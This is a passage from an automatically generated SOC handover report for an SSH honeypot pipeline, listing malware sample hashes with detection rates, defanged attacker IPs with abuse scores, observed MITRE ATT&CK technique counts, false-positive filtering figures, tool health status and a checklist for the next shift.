| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.76.130[.]255` | HK | Alibaba Cloud - HK | **100** ⚠️ | 3 |
| `120.230.180[.]244` | CN | China Mobile Communications Corporation | **100** ⚠️ | 9 |
| `183.247.171[.]186` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `100.2.219[.]251` | US | Verizon Business | **100** ⚠️ | 17 |
| `65.20.158[.]10` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 49 |
| `45.79.115[.]134` | US | Linode | **100** ⚠️ | 50 |
| `118.34.180[.]142` | KR | Sudogwongangnambonbujang | **100** ⚠️ | 50 |
| `64.227.108[.]146` | US | DigitalOcean, LLC | **100** ⚠️ | 24 |
| `46.225.75[.]48` | DE | Hetzner Online GmbH | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 35 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 106 cases |
| Tool 34  | Credential Extractor        | ✅ 38 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (31.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 34 recon entry/entries in table (4 group(s) consolidating 34 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T16:55:49Z_
